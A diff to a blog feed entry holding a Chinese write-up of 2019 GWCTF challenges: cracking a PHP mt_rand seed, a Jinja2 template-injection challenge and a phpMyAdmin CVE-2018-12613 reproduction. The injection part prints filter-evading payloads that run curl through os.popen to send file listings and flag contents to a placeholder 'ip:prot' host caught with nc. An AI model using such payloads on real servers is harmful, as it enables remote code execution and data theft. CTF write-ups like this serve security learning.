@@ -89,14 +89,21 @@
   <entry>
     <title>2019 GWCTF部分题解</title>
     <url>/2019/12/09/2019-GWCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
-    <content><![CDATA[<p>1.你的名字</p><p>ssti，过滤了一些关键字为空，不能有，给出payload，vps上nc -lvp port，效果如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% iconfigf <span class="string">''</span>.__claconfigss__.__mconfigro__[<span class="number">2</span>].__subclasconfigses__()[<span class="number">59</span>].__inconfigit__.fconfigunc_glconfigobals.linecconfigache.oconfigs.popconfigen(<span class="string">'curl http://ip:prot/ -d `ls /|grep flag`;'</span>) %&#125;<span class="number">1</span>&#123;% endiconfigf %&#125;	//找flag</span><br></pre></td></tr></table></figure><a id="more"></a>
+    <content><![CDATA[<p>1.枯燥的抽奖</p><p>伪随机数种子猜解，这里用别人写好的工具php_mt_seed找到种子，先转换成工具容易识别的格式，然后得到种子，找到后面的数字即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'3u6dFIRBNn'</span></span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><a id="more"></a>
 
 
+
+<p><img src="1576198065261.png" alt="1576198065261"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">841432117</span>);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>2.你的名字</p>
+<p>ssti，过滤了一些关键字为空，不能有，给出payload，vps上nc -lvp port，效果如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% iconfigf <span class="string">''</span>.__claconfigss__.__mconfigro__[<span class="number">2</span>].__subclasconfigses__()[<span class="number">59</span>].__inconfigit__.fconfigunc_glconfigobals.linecconfigache.oconfigs.popconfigen(<span class="string">'curl http://ip:prot/ -d `ls /|grep flag`;'</span>) %&#125;<span class="number">1</span>&#123;% endiconfigf %&#125;	//找flag</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% iconfigf <span class="string">''</span>.__claconfigss__.__mconfigro__[<span class="number">2</span>].__subclasconfigses__()[<span class="number">59</span>].__inconfigit__.fconfigunc_glconfigobals.linecconfigache.oconfigs.popconfigen(<span class="string">'curl http://ip:prot/ -d `cat /flag_1s_Hera`;'</span>) %&#125;<span class="number">1</span>&#123;% endiconfigf %&#125;	//读flag</span><br></pre></td></tr></table></figure>
 
 <p><img src="1576158079092.png" alt="1576158079092"></p>
-<p>2.我有一个数据库</p>
+<p>3.我有一个数据库</p>
 <p>CVE-2018-12613的复现，影响版本:4.8.0—4.8.1。访问phpmyadmin直接进来phpmyadmin界面，发现版本为4.8.1测试一下存在CVE-2018-12613包含漏洞。</p>
 <p><img src="1575877114348.png" alt="1575877114348"></p>
 <p>盲猜flag在根目录</p>
